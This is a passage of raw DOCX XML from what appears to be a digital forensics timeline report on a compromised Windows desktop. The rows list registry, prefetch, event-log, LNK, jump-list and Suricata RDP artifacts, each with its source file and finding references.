                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Network\Z</w:t>
              <w:br/>
              <w:t>Network Shares | Network Shares | RemotePath=\\CITADEL-DC01\FileShare</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#1462</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\ricksanchez\NTUSER.DAT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-025</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:57.112379</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Exclusions\Paths</w:t>
              <w:br/>
              <w:t>Threat Hunting | Windows Defender</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#8632</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, F-030</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:53:11.065740</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, previous)</w:t>
              <w:br/>
              <w:t>CMD.EXE</w:t>
              <w:br/>
              <w:t>runs=9 hash=BD30981 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\CMD.EXE-0BD30981.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-009, F-012, T-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:55:33.992616</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S-1-5-21-2232410529-1445159330-2725690660-500 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38829</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-022, T-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:55:33.996906</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S-1-5-21-2232410529-1445159330-2725690660-512 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38830</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-022</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:55:33.998901</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S-1-5-21-2232410529-1445159330-2725690660-513 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38831</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-022</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:55:34.000371</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>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S-1-5-21-2232410529-1445159330-2725690660-1108 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38832</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-022, T-019</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:56:15.503156</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: ProfileList</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Profile: last logoff</w:t>
              <w:br/>
              <w:t>C:\Users\ricksanchez</w:t>
              <w:br/>
              <w:t>S-1-5-21-2232410529-1445159330-2725690660-1106</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_ProfileList.csv#4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:59:58.124958</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: ProfileList</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Profile: last logon</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith</w:t>
              <w:br/>
              <w:t>S-1-5-21-2232410529-1445159330-2725690660-1108</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_ProfileList.csv#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 23:07:44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK) ; Target: modified (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Documents\Portal_gun.png</w:t>
              <w:br/>
              <w:t>machine=desktop-sdn1rpt MAC=00:0c:29:14:c2:95 volume=B0E0E8FF Fixed storage media (Hard drive) size=130678</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Portal_gun.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-013, T-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:04.500156</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump List: entry created (≈ first opened)</w:t>
              <w:br/>
              <w:t>C:\Users\mortysmith\Documents\loot.zip</w:t>
              <w:br/>
              <w:t>Quick Access interactions=1 machine=desktop-sdn1rpt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261025191825_AutomaticDestinations.csv#9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\5f7b5f1e01b83767.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-026</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:04.500197</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump Lists (automatic)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Jump List: entry created (≈ first opened)</w:t>
              <w:br/>
              <w:t>E:\DESKTOP-SDN1RPT\Protected Files</w:t>
              <w:br/>
              <w:t>Windows Explorer Windows 8.1 interactions=1 machine=desktop-sdn1rpt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd/20261025191825_AutomaticDestinations.csv#41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\ricksanchez\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\f01b4d95cf55d32a.automaticDestinations-ms</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-028</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:04.797835</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 12 | Microsoft-Windows-Kernel-General | OS was started | StartTime: 2020-09-19 01:24:04.5000000 | BootMode: Normal boot</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40528</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001, T-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:09.020263</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 6005 | EventLog | The Event log service was started | Computer: DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40524</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:54:37.447633</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\svchost.exe</w:t>
              <w:br/>
              <w:t>Security 4616 | Microsoft-Windows-Security-Auditing | The system time was changed | PreviousTime: 2020-09-19 01:54:37.4418021 | NewTime: 2020-09-19 01:54:37.4469563 | LogonId: 0x3E5 | C:\Windows\System32\svchost.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39495</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004, F-032</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:19:26.619607</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network events (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network event</w:t>
              <w:br/>
              <w:t>rdp TCP 10.42.85.10:3389 -&gt; 194.61.24.102:38100</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_rdp.jsonl#1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
